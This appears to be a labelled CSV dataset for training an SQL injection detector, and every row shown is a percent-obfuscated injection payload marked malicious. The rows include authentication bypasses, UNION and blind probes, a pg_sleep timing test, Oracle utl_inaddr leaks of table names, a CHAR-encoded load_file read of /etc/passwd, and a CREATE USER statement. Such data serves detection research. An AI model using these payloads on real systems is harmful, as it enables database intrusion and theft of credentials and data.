Query,Label
""" %%or pg_sleep  (  __TIME__  )  --",1
%%c%%r%%e%a%t%%e user name identified by pass123 temp%o%rary %t%%ab%lespace temp default %t%%ab%lespace users;,1
" %%a%n%%d 1  =  utl_inaddr.get_host_address   (    (   s%%ele%c%t D%%isTinCT  (  %%t%%a%%b%l%e_name  )   %f%%rom   (  s%%ele%c%t D%%isTinCT  (  %%t%%a%%b%l%e_name  )  , ROWNUM AS %li%%m%i%t %f%%rom sys.all_%%t%%a%%b%l%es  )   %%wher%%e %li%%m%i%t  =  5   )    )    %%a%n%%d 'i'  =  'i",1
" %s%%e%l%%e%%c%t * f%%r%o%%m users %%wh%er%%e id  =  '1' %o%%r @ @1  =  1 %%u%%nio%%n %s%%e%l%%e%%c%t 1,version  (    )   -- 1'",1
" %%s%e%l%%e%c%%t * f%r%om users whe%r%%e id  =  1 %%or 1#""  (   %%u%%n%i%%o%n %%s%e%l%%e%c%%t 1,version  (    )   -- 1",1
 %se%l%ec%%t name %f%%r%%om syscolumns %%w%%h%e%re id   =     (  %se%l%ec%%t id %f%%r%%om sysobjects %%w%%h%e%re name   =   %t%%a%%b%%l%ename'  )  --,1
%%s%%el%%e%c%%t * %%f%r%o%m users %w%%he%r%%e id  =  1 +$+ %%o%r 1  =  1 -- 1,1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115,115,119,100   )    )     )  ,1,1,1;",1
" %se%%l%e%c%%t * %f%%r%om users w%%h%%e%r%%e id  =  '1' %%o%%r ||/1  =  1 %u%%n%%i%%o%n %se%%l%e%c%%t 1,version  (    )   -- 1'",1
" s%e%l%%ect * %%fr%om users w%h%%er%e id  =  '1' %o%r \.<\ %un%i%o%n s%e%l%%ect 1,@@VERSION -- 1'",1
? o%%r 1  =  1 --,1
 )   o%r   (  'a'  =  'a,1
admi%%n' o%%r 1  =  1#,1
" %se%%le%%ct * %fr%om users %%w%h%e%%re id  =  1 or ""  (  ]"" or 1  =  1 -- 1",1
%%o%r 1  =  1 --,1
" and 1  =  utl_%i%%naddr.get_host_address   (    (   se%l%ec%t Di%sT%i%%nCT  (  column_name  )   f%%r%%om   (  se%l%ec%t Di%sT%i%%nCT  (  column_name  )  , ROWNUM AS %%l%%imit f%%r%%om all_tab_columns  )   w%%h%%er%e %%l%%imit  =  5   )    )    and 'i'  =  'i",1
" %s%el%%e%c%t * %%f%%r%%o%m users %%wh%%er%e id  =  '1' %!<@ uni%o%%n %s%el%%e%c%t 1,version  (    )   -- 1'",1
" s%e%l%%e%%c%%t * f%r%o%m users %%wh%%e%re id  =  1 %%or ""&  (  "" %%or 1  =  1 -- 1",1
" s%e%le%c%%t * %%f%%r%%om users wh%e%r%%e id  =  1 %o%r ""?  (  "" %o%r 1  =  1 -- 1",1
d%i%%stinct,1
sel%e%%c%%t * fr%o%m users %%w%%h%%e%r%e id  =  '1' *  (  \  )   %or 1  =  1 -- 1',1
"1 %%a%%n%d %%a%%s%%cii  (  lower  (  substri%%ng   (    (   %%s%%e%%le%%c%t top 1 name %%f%r%om sysobjects %w%her%e xtype  =  'u'  )  , 1, 1   )    )     )   > 116",1
se%%l%e%%ct * f%%ro%%m users %%w%%h%%e%%r%%e id  =  1 or \.<\ or 1  =  1 -- 1,1
"adm%i%n"" %or ""1""  =  ""1""--",1
" %%s%%e%%le%%c%%t * %%f%%ro%m users %%whe%%r%%e id  =  1 o%r ""%{"" o%r 1  =  1 -- 1",1
i%n%s%%e%%rt,1
" %sel%%e%ct * f%%r%o%m users %%wh%e%r%e id  =  1 o%r 1#""?  =  1 o%r 1  =  1 -- 1",1
" %%s%%el%%e%c%%t * %%fr%%om users %%w%%h%er%e id  =  1 %%o%%r ""%?"" %%o%%r 1  =  1 -- 1",1
